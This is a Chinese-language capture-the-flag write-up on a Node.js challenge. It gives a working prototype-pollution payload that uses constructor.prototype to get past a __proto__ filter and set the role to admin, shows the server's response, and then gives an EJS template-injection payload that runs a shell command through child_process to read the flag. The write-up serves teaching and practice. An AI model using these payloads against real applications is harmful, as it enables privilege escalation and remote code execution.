根据源代码中merge函数

```
function merge(target, source) {
    for (let key in source) {
        // Prevent prototype pollution
        if (key === '__proto__') {
            throw new Error("Detected Prototype Pollution")
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

和login接口中

```
        // save userinfo to session
        let data = {};
        try {
            merge(data, req.body)
        } catch (e) {
            return res.render("login", {message: "Don't pollution my shared diary!"})
        }
```

不难发现这里因为merge导致了原型链污染，我们的目标是污染对象的role属性，使其成为`admin`，在了解原型链污染漏洞后，会很自然会想到

`{"__proto__": {"role": "admin"},"username":"ek1ng","password":"123"}`

但是这里merge时会对`__proto__`属性做检测，这里可以使用constructor.protoype来bypass 对于`__proto__`的waf，灵感来自于lodash的CVE-2019-10744中的绕过技巧，lodash也是因为只检测了`__proto__`属性，在lodash.merge中就有这种类似的方法可以绕过。

```
POST /login HTTP/1.1
Content-Type: application/json
Host: localhost:8888

{"constructor": {"prototype": {"role": "admin"}},"username":"ek1ng","password":"123"}
```

得到响应

```
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /
Vary: Accept
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=s%3AhoHS3GiWTRM8GDtDpYSMKKbES5JLehkp.8dRxdwLFQ8f9vW9kW75CM9C9aTYLakaldJbwne61DmA; Path=/; HttpOnly
Date: Mon, 30 Jan 2023 06:47:14 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 23

Found. Redirecting to /
```

这样构造就可以成功污染原型链，拿到session.role为admin的session。

这里可以本地调试看一下污染后的session的原型链

![image-20230130144906545](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/202301301449648.png)

这里需要注意污染后再之后去正常的登陆请求，都会因为merge函数抛出异常（并不是检测到__proto__属性，而是这样写法的merge函数会在原型链被污染后无法正常merge，会抛出异常，可以打个断点调试一下）而被认为是检测到原型链污染。这里是希望选手能够在本地有自己搭建环境并且进行调试的能力，不然可能做起来会比较困难，很难知道是否能够成功污染原型链。

之后是一个ejs ssti ，可以插入`<%- %>`标签来执行任意js，能够直接完成RCE。

`<%- global.process.mainModule.require('child_process').execSync('cat /flag') %>`

![image-20230130010137313](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/202301300101429.png)
